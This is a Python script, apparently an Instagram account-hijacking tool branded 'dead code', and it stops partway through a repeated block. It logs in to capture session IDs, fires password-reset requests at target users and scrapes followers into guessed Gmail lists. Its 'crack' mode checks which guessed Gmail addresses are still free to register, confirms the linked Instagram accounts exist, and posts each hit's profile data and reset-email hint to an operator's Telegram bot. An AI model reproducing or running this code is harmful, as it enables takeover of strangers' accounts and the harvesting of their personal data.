#----------------------library or color -----------------------#
import requests
import re
import random
import pyfiglet
import urllib
from cfonts import render
import time
import datetime
import threading
import json
import sys
import os
from uuid import uuid4
from user_agent import generate_user_agent
import instaloader
hit = 0
uid = uuid4()
X = '\033[2;33m'
F = '\033[2;32m'
W = '\033[2;35m'
B = '\033[2;36m'
A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"
M = "\033[1;96m"
def jalan(z):
 for e in z + '\n':
  sys.stdout.write(e)
  sys.stdout.flush()
  time.sleep(20/1000)
now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)
hours = (now.hour)
x = datetime.datetime.now()
g= datetime.datetime(2022, 9, 30, 0, 00 ,0)
if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print("راجـع الـمـطـور خـلـص الاشـتـراك @S7C_Z")
 print('\n\n')
 print(x)
 sys.exit(0) 
if (x.strftime("%x"))==(g.strftime("%x")):
   print('')
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    print("خـلـص الاشـتـراك روح اشـتـرك وجـه الـسـطـل\n @S7C_Z 😂😂")
    print('\n@deadcode_22\n')
    print(x)    
    sys.exit(0)
   else:
    print('')  
else:
    print('')
print('')
os.system('clear')  
#--------------------------start code----------------------------#
logo = render('statu',colors=["red","green"],align='center')
for i in logo.splitlines():
	time.sleep(0.05)
	print(i)
jalan( """ \033[1;91m------------------------------------ """)	
print(C + "  (" + E + "1" + C + ") " + C + "GET SESSIONID " + E)
print(C + "  (" + E + "2" + C + ") " + C + "GET REST INSTA " + E)
print(C + "  (" + E + "3" + C + ") " + C + "MADE LIST FROM USER " + E)
print(C + "  (" + E + "4" + C + ") " + C + "START CRACK INSTA " + E)
jalan( """ \033[1;91m------------------------------------ """)
nu = int(input(C + "  (" + E + "⌯" + C + ") " + C + "ENTER NUMBER : " + E))
#--------------------------choice---------------------------#
if nu == 1:
    os.system('clear')
    ogo = render('SESSION',colors=["red","green"],align='center')
    for i in ogo.splitlines():
        time.sleep(0.05)
        print(i)
    jalan( """ \033[1;91m------------------------------------ """)
    username = input(C + " (" + E + "⌯" + C + ") " + C + "ENTER USERNAME  : " + E)
    password = input(C + " (" + E + "⌯" + C + ") " + C + "ENTER PASSWORD  : " + E)
    jalan( """ \033[1;91m------------------------------------ """)
    url ='https://www.instagram.com/accounts/login/ajax/'
    head1 = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
        'content-length': '319',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'mid=YrX_FwABAAFVRYLepbLqUSO9nyBK; ig_did=B86D9D0C-8059-4D38-AB32-62F66F91EB8A; ig_nrcb=1; shbid="6887\054479320179\0541687630562:01f72f17d27d1bf82c5011a7e21c360468f4e96ffc8c8d9bc8f3389196b275ab0b6d598c"; shbts="1656094562\054479320179\0541687630562:01f75b9e3dad31375f7599a21ee1e6b0b33b430c850ee605a7591dd83682126848a683cd"; dpr=3; datr=av-1Yj1HLbt2sRgtjJ2hIyTk; rur="ASH\054479320179\0541687707865:01f7969a9a044b6e5a39c124177ea698ce171408d797be83e4e94e6efc69642ea3b90ed9"; csrftoken=QZnASSTl4lB3b1sG610j7UGrPk0TfrN0',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; JSN-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
        'viewport-width': '360',
        'x-asbd-id': '437806',
        'x-csrftoken': 'QZnASSTl4lB3b1sG610j7UGrPk0TfrN0',
        'x-ig-app-id': '1217981644879628',
        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
        'x-instagram-ajax': '57ac339ce6f4',
        'x-requested-with': 'XMLHttpRequest'
    }
    tim = str(time.time()).split('.')[1]
    data1 = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{password}',
        'queryParams': '{}',
        'optIntoOneTap': 'false',
        'trustedDeviceRecords': '{}'
    }
    rq = requests.post(url,headers=head1,data=data1)
    if ('"userId"') in rq.text:
        coo = rq.cookies.get_dict()
        sessionid= coo["sessionid"]
        print(L+' Sessionid=> \n ')
        print(H+sessionid)
    else:
        print(A+' ❌ Error Login !!?🔴 ')
        pass
elif nu == 2:
    os.system('clear')
    dog = render('REST',colors=["red","green"],align='center')
    for i in dog.splitlines():
        time.sleep(0.05)
        print(i)
    jalan( """ \033[1;91m------------------------------------ """)	
    use = input(C + " (" + E + "⌯" + C + ") " + C + "ENTER USERNAME  : " + E)
    jalan( """ \033[1;91m------------------------------------ """)
    ree = requests.get(f"https://mr-abood.herokuapp.com/Instagram/Info?User={use}").json()
    iid = ree["results"]["id"]
    he = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar',
'cookie': 'csrftoken=qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI;mid=Yw2UXgAEAAE4Z0qqjhY5LAruCxGL;ig_did=581A8852-CB4E-4DCE-8112-8DBD48CFA6DF;ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'x-asbd-id': '198387',
'x-csrftoken': 'qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': '0',
}
    url = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
    he = {
'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2004; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_EG_#u-nu-arab)',
'Cookie': 'mid=YwsgcAABAAGsRwCKCbYCaUO5xej3; csrftoken=u6c8M4zaneeZBfR5scLVY43lYSIoUhxL',
'Cookie2': '$Version=1',
'Accept-Language': 'ar-EG, en-US',
'X-IG-Connection-Type': 'MOBILE(LTE)',
'X-IG-Capabilities': 'AQ==',
'Accept-Encoding': 'gzip',
}
    data = {
"user_id":iid,"device_id":uid,
}
    try:
     code = requests.post(url,headers=he, data=data).json()
     rest = code["obfuscated_email"]
     print(E+f' ✅ • Done Rest {use} ')       
    except:
     print(A+f' ❌ • Error Rest {use} ')
elif nu == 3:
    st=0
    username=input(f' {X}[+]{W} -{F} ENTER USERNAME :{F} ')
    password=input(f' {X}[+]{W} -{F} ENTER PASSWORD  :{F} ')
    targe=input(f' {X}[+]{W} - {F}GET USER INSTA MADE LIST FROM IS :{B} ')
    L = instaloader.Instaloader()
    try:
     L.login(username,password)
    except:
     exit(A+' ❌ ERROR LOGEN 🔴 ')
    profile = instaloader.Profile.from_username(L.context, targe)
    follow_list = []
    for i in profile.get_followers():
        user=str(i)
        use= user.split('<Profile ')[1].split('(')[0]
        st+=1
        print(f'''{X} 𓊆 {st} 𓊇 {F}{use}''')
        use2=use+'@gmail.com'
        username=use2.replace(" ","")
        file = open("username.txt","a+")
        file.write(username)
        file.write("\n")
        file.close()
        print(F+'  ✅ DONE SAVE NAME ~ username.txt ✅ ')   
elif nu == 4:
    os.system('clear')
    logo = render('crack',colors=["red","green"],align='center')
    for i in logo.splitlines():
        time.sleep(0.05)
        print(i)
    jalan( """ \033[1;91m------------------------------------ """)
    token = input(C + " (" + E + "⌯" + C + ") " + C + "ENTER TOKEN  : " + E)
    ID = input(C + " (" + E + "⌯" + C + ") " + C + "ENTER ID  : " + E)
    sessionid = input(C + " (" + E + "⌯" + C + ") " + C + "ENTER SESSIONID  : " + E)
    header ={'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+sessionid}
    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=❝𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐢𝐧 𝐝𝐞𝐚𝐝 𝐜𝐨𝐝𝐞 𝐓𝐨𝐨𝐥❞ 🔱")
    jalan( """ \033[1;91m------------------------------------ """)
#--------------------start crack-----------------------#
    print(C + "  (" + E + "1" + C + ") " + C + "START CRACK RANDOM " + E)
    print(C + "  (" + E + "2" + C + ") " + C + "CHEAK FROM LIST " + E)
    jalan( """ \033[1;91m------------------------------------ """)
    new = int(input(C + "  (" + E + "⌯" + C + ") " + C + "ENTER NUMBER : " + E))
    jalan( """ \033[1;91m------------------------------------ """)
    if new == 1:
        while True:
            user='1234567890qwertyuiopasdfghjklzxcvbnm.'
            num='456789'
            rng=int("".join(random.choice(num)for i in range(1)))
            name=str("".join(random.choice(user)for i in range(rng)))
            ch = requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=header)
            if "users" in ch.text:
             for i in ch.json()["users"]:
              user=(i['user']['username'])
              em = user
              email = em+"@gmail.com"
              url = 'https://android.clients.google.com/setup/checkavail'
              hed = {
	    'Content-Length':'98',
	    'Content-Type':'text/plain; charset=UTF-8',
	    'Host':'android.clients.google.com',
	    'Connection':'Keep-Alive',
	    'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
              data = json.dumps({
	'username':email,
	'version':'3',
	'firstName':'@S7C_Z',
	'lastName':'deadcode_22'})
              res = requests.post(url,data=data,headers=hed)
              if res.json()['status'] == 'SUCCESS':
                 url='https://i.instagram.com/api/v1/accounts/login/'
                 headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)','Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                 'Host':'i.instagram.com'}
                 data = {'uuid':uid,'password':'DEADCODE_22',
            'username':email,
            'device_id':uid,
            'from_reg':'false',
            '_csrftoken':'missing',
            'login_attempt_countn':'0'}
                 req= requests.post(url, headers=headers, data=data).json()
                 if req['message'] == 'The password you entered is incorrect. Please try again.':
        	              print(C + " (" + E + "⌯" + C + ") " + E +f' GoD Email ☞ {email} ')
        	              hit += 1
        	              try:
        	               url = f"https://mr-abood.herokuapp.com/Instagram/Info?User={user}"
        	               r = requests.get(url).json()
        	               NAME = r["results"]["name"]
        	               POSTS = r["results"]["Posts"]
        	               Followers = r["results"]["Followers"]
        	               Following = r["results"]["Following"]
        	               idd = r["results"]["id"]
        	               Data = r["results"]["created date"]
        	               he = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar',
'cookie': 'csrftoken=qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI;mid=Yw2UXgAEAAE4Z0qqjhY5LAruCxGL;ig_did=581A8852-CB4E-4DCE-8112-8DBD48CFA6DF;ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'x-asbd-id': '198387',
'x-csrftoken': 'qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': '0',
}
        	               url = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
        	               he = {
'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2004; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_EG_#u-nu-arab)',
'Cookie': 'mid=YwsgcAABAAGsRwCKCbYCaUO5xej3; csrftoken=u6c8M4zaneeZBfR5scLVY43lYSIoUhxL',
'Cookie2': '$Version=1',
'Accept-Language': 'ar-EG, en-US',
'X-IG-Connection-Type': 'MOBILE(LTE)',
'X-IG-Capabilities': 'AQ==',
'Accept-Encoding': 'gzip',
}
        	               data = {
"user_id":idd,"device_id":uid,
}
        	               code = requests.post(url,headers=he, data=data).json()
        	               rest = code["obfuscated_email"]
        	               f'''꧁𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌꧂
⋘────━𓆩𝐃𝐄𝐀𝐃𓆪‏━────⋙  
✘ > 𝐇𝐈𝐓 : {hit}                
✘ > 𝑰𝑫 : {idd}                        
𖠖 > 𝐍𝐀𝐌𝐄 : {NAME}                    
𖠖 > 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : {user} 
𖠖 > 𝐄𝐌𝐀𝐈𝐋 : {email}            
𖠖 > 𝐅𝐎𝐋𝐋𝐎𝐈𝐍𝐆 : {Following}                
𖠖 > 𝐅𝐎𝐋𝐋𝐎𝐄𝐑𝐒 : {Followers}            
𖠖 > 𝐏𝐎𝐒𝐓 : {POSTS}    
𖠖 > 𝐃𝐀𝐓𝐀  : {Data}        
𖠖 >  𝐑𝐄𝐒𝐓 » {rest}        
𖠖 > 𝐋𝐈𝐍𝐊 : https://www.instagram.com/{user}        
⋘────━𓆩𝐃𝐄𝐀𝐃𓆪‏━────⋙ 
𖠖 > 𝐁𝐘 : @S7C_Z - @DEADCODE_22 . '''
        	               print(E+d+'\n')			             
        	               requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={d}")
        	              except:
        	               r = requests.get(f"https://mr-abood.herokuapp.com/Instagram/Info?User={user}").json()
        	               POSTS = r["results"]["Posts"]
        	               Followers = r["results"]["Followers"]
        	               Following = r["results"]["Following"]
        	               idd = r["results"]["id"]
        	               Data = r["results"]["created date"]
        	               d = f'''⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ 𝙳𝙴𝙰𝙳 𝙲𝙾𝙳𝙴 ⌯
•━━━━━━━━━━━━━━━•
⌯ 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 » {user}
⌯ 𝙴𝙼𝙰𝙸𝙻 » {email}
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 » {Followers}
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶 » {Following}
⌯ 𝙸𝙳 » {idd}
⌯ 𝙿𝙾𝚂𝚃𝚂 » {POSTS}
⌯ 𝙳𝙰𝚃𝙰 » {Data}
⌯ 𝙻𝙸𝙽𝚔 » https://www.instagram.com/{user}
•━━━━━━━━━━━━━━━•
◔‌◔ ʙʏ » @S7C_Z - @DEADCODE_22 .'''
        	               print(E+d+'\n')
        	               requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={d}")
        	               pass
                 elif req['message'] == 'The password you entered is incorrect. Please try again or log in with Facebook.':
        	         print(C + " (" + E + "⌯" + C + ") " + E +f' GoD Email ☞ {email} ')
        	         hit += 1
        	         try:
        	          url = f"https://mr-abood.herokuapp.com/Instagram/Info?User={user}"
        	          r = requests.get(url).json()
        	          NAME = r["results"]["name"]
        	          POSTS = r["results"]["Posts"]
        	          Followers = r["results"]["Followers"]
        	          Following = r["results"]["Following"]
        	          idd = r["results"]["id"]
        	          Data = r["results"]["created date"]
        	          he = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar',
'cookie': 'csrftoken=qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI;mid=Yw2UXgAEAAE4Z0qqjhY5LAruCxGL;ig_did=581A8852-CB4E-4DCE-8112-8DBD48CFA6DF;ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'x-asbd-id': '198387',
'x-csrftoken': 'qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': '0',
}
        	          url = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
        	          he = {
'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2004; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_EG_#u-nu-arab)',
'Cookie': 'mid=YwsgcAABAAGsRwCKCbYCaUO5xej3; csrftoken=u6c8M4zaneeZBfR5scLVY43lYSIoUhxL',
'Cookie2': '$Version=1',
'Accept-Language': 'ar-EG, en-US',
'X-IG-Connection-Type': 'MOBILE(LTE)',
'X-IG-Capabilities': 'AQ==',
'Accept-Encoding': 'gzip',
}
        	          data = {
"user_id":idd,"device_id":uid,
}
        	          code = requests.post(url,headers=he, data=data).json()
        	          rest = code["obfuscated_email"]
        	          d = f'''꧁𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌꧂
⋘────━𓆩𝐃𝐄𝐀𝐃𓆪‏━────⋙  
✘ > 𝐇𝐈𝐓 : {hit}            
✘ > 𝑰𝑫 : {idd}                
𖠖 > 𝐍𝐀𝐌𝐄 : {NAME}            
𖠖 > 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : {user} 
𖠖 > 𝐄𝐌𝐀𝐈𝐋 : {email}                
𖠖 > 𝐅𝐎𝐋𝐋𝐎𝐈𝐍𝐆 : {Following}                
𖠖 > 𝐅𝐎𝐋𝐋𝐎𝐄𝐑𝐒 : {Followers}                
𖠖 > 𝐏𝐎𝐒𝐓 : {POSTS}                
𖠖 > 𝐃𝐀𝐓𝐀  : {Data}            
𖠖 >  𝐑𝐄𝐒𝐓 » {rest}                
𖠖 > 𝐋𝐈𝐍𝐊 : https://www.instagram.com/{user}            
⋘────━𓆩𝐃𝐄𝐀𝐃𓆪‏━────⋙ 
𖠖 > 𝐁𝐘 : @S7C_Z - @DEADCODE_22 . '''
        	          print(E+d+'\n')			             
        	          requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={d}")
        	         except:
        	               r = requests.get(f"https://mr-abood.herokuapp.com/Instagram/Info?User={user}").json()
        	               POSTS = r["results"]["Posts"]
        	               Followers = r["results"]["Followers"]
        	               Following = r["results"]["Following"]
        	               idd = r["results"]["id"]
        	               Data = r["results"]["created date"]
        	               d = f'''⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ 𝙳𝙴𝙰𝙳 𝙲𝙾𝙳𝙴 ⌯
•━━━━━━━━━━━━━━━•
⌯ 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 » {user}
⌯ 𝙴𝙼𝙰𝙸𝙻 » {email}
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 » {Followers}
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶 » {Following}
⌯ 𝙸𝙳 » {idd}
⌯ 𝙿𝙾𝚂𝚃𝚂 » {POSTS}
⌯ 𝙳𝙰𝚃𝙰 » {Data}
⌯ 𝙻𝙸𝙽𝚔 » https://www.instagram.com/{user}
•━━━━━━━━━━━━━━━•
◔‌◔ ʙʏ » @S7C_Z - @DEADCODE_22 .'''
        	               print(E+d+'\n')
        	               requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={d}")
        	               pass
                 elif req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
        	             print(C + " (" + E + "⌯" + C + ") " + M + f' Not Insta ☞ {email} ')
                 else:
        	             print(C + " (" + E + "⌯" + C + ") " + M + f' Not Insta ☞ {email} ')        	             
              elif res.json()['status'] =='USERNAME_UNAVAILABLE':
                     print(C + " (" + E + "⌯" + C + ") " + A +f' BaD Email ☞ {email} ')
              else:
                     print(f"{A} YOUR IP BOCKID ")
                     sys.exit()		    
        else:
        	 pass       
    if new == 2:
        text = input(C + "  (" + E + "⌯" + C + ") " + C + "ENTER NAME LIST : " + E)
        jalan( """ \033[1;91m------------------------------------ """)
        try:
            filee = open(f'{text}', "r")
        except:
            exit(' ❌ Not found your list ')
#-------------------------------------------    
        while True:
            ur = filee.readline().split('\n')[0]
            if ur =='':
                exit(' 👌🏻 DONE FINESHED LISTA 🔴 ')
            name = ur.split('@')[0]
            ch = requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=header)
            if "users" in ch.text:
             for i in ch.json()["users"]:
              user=(i['user']['username'])
              em = user
              email = em+"@gmail.com"
              url = 'https://android.clients.google.com/setup/checkavail'
              hed = {
	    'Content-Length':'98',
	    'Content-Type':'text/plain; charset=UTF-8',
	    'Host':'android.clients.google.com',
	    'Connection':'Keep-Alive',
	    'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
              data = json.dumps({
	'username':email,
	'version':'3',
	'firstName':'@S7C_Z',
	'lastName':'deadcode_22'})
              res = requests.post(url,data=data,headers=hed)
              if res.json()['status'] == 'SUCCESS':
                 url='https://i.instagram.com/api/v1/accounts/login/'
                 headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)','Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                 'Host':'i.instagram.com'}
                 data = {'uuid':uid,'password':'DEADCODE_22',
            'username':email,
            'device_id':uid,
            'from_reg':'false',
            '_csrftoken':'missing',
            'login_attempt_countn':'0'}
                 req= requests.post(url, headers=headers, data=data).json()
                 if req['message'] == 'The password you entered is incorrect. Please try again.':
        	              print(C + " (" + E + "⌯" + C + ") " + E +f' GoD Email ☞ {email} ')
        	              hit += 1
        	              try:
        	               url = f"https://mr-abood.herokuapp.com/Instagram/Info?User={user}"
        	               r = requests.get(url).json()
        	               NAME = r["results"]["name"]
        	               POSTS = r["results"]["Posts"]
        	               Followers = r["results"]["Followers"]
        	               Following = r["results"]["Following"]
        	               idd = r["results"]["id"]
        	               Data = r["results"]["created date"]
        	               he = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar',
'cookie': 'csrftoken=qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI;mid=Yw2UXgAEAAE4Z0qqjhY5LAruCxGL;ig_did=581A8852-CB4E-4DCE-8112-8DBD48CFA6DF;ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'x-asbd-id': '198387',
'x-csrftoken': 'qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': '0',
}
        	               url = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
        	               he = {
'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2004; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_EG_#u-nu-arab)',
'Cookie': 'mid=YwsgcAABAAGsRwCKCbYCaUO5xej3; csrftoken=u6c8M4zaneeZBfR5scLVY43lYSIoUhxL',
'Cookie2': '$Version=1',
'Accept-Language': 'ar-EG, en-US',
'X-IG-Connection-Type': 'MOBILE(LTE)',
'X-IG-Capabilities': 'AQ==',
'Accept-Encoding': 'gzip',
}
        	               data = {
"user_id":idd,"device_id":uid,
}
        	               code = requests.post(url,headers=he, data=data).json()
        	               rest = code["obfuscated_email"]
        	               d = f'''꧁𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌꧂
⋘────━𓆩𝐃𝐄𝐀𝐃𓆪‏━────⋙  
✘ > 𝐇𝐈𝐓 : {hit}                
✘ > 𝑰𝑫 : {idd}                        
𖠖 > 𝐍𝐀𝐌𝐄 : {NAME}                    
𖠖 > 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : {user} 
𖠖 > 𝐄𝐌𝐀𝐈𝐋 : {email}            
𖠖 > 𝐅𝐎𝐋𝐋𝐎𝐈𝐍𝐆 : {Following}                
𖠖 > 𝐅𝐎𝐋𝐋𝐎𝐄𝐑𝐒 : {Followers}            
𖠖 > 𝐏𝐎𝐒𝐓 : {POSTS}    
𖠖 > 𝐃𝐀𝐓𝐀  : {Data}        
𖠖 >  𝐑𝐄𝐒𝐓 » {rest}        
𖠖 > 𝐋𝐈𝐍𝐊 : https://www.instagram.com/{user}        
⋘────━𓆩𝐃𝐄𝐀𝐃𓆪‏━────⋙ 
𖠖 > 𝐁𝐘 : @S7C_Z - @DEADCODE_22 . '''
        	               print(E+d+'\n')			             
        	               requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={d}")
        	              except:
        	               r = requests.get(f"https://mr-abood.herokuapp.com/Instagram/Info?User={user}").json()
        	               POSTS = r["results"]["Posts"]
        	               Followers = r["results"]["Followers"]
        	               Following = r["results"]["Following"]
        	               idd = r["results"]["id"]
        	               Data = r["results"]["created date"]
        	               d = f'''⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ 𝙳𝙴𝙰𝙳 𝙲𝙾𝙳𝙴 ⌯
•━━━━━━━━━━━━━━━•
⌯ 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 » {user}
⌯ 𝙴𝙼𝙰𝙸𝙻 » {email}
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 » {Followers}
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶 » {Following}
⌯ 𝙸𝙳 » {idd}
⌯ 𝙿𝙾𝚂𝚃𝚂 » {POSTS}
⌯ 𝙳𝙰𝚃𝙰 » {Data}
⌯ 𝙻𝙸𝙽𝚔 » https://www.instagram.com/{user}
•━━━━━━━━━━━━━━━•
◔‌◔ ʙʏ » @S7C_Z - @DEADCODE_22 .'''
        	               print(E+d)
        	               requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={d}")
        	               pass
                 if req['message'] == 'The password you entered is incorrect. Please try again or log in with Facebook.':
        	         print(C + " (" + E + "⌯" + C + ") " + E +f' GoD Email ☞ {email} ')
        	         hit += 1
        	         try:
        	          url = f"https://mr-abood.herokuapp.com/Instagram/Info?User={user}"
        	          r = requests.get(url).json()
        	          NAME = r["results"]["name"]
        	          POSTS = r["results"]["Posts"]
        	          Followers = r["results"]["Followers"]
        	          Following = r["results"]["Following"]
        	          idd = r["results"]["id"]
        	          Data = r["results"]["created date"]
        	          he = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar',
'cookie': 'csrftoken=qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI;mid=Yw2UXgAEAAE4Z0qqjhY5LAruCxGL;ig_did=581A8852-CB4E-4DCE-8112-8DBD48CFA6DF;ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'x-asbd-id': '198387',
'x-csrftoken': 'qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI',
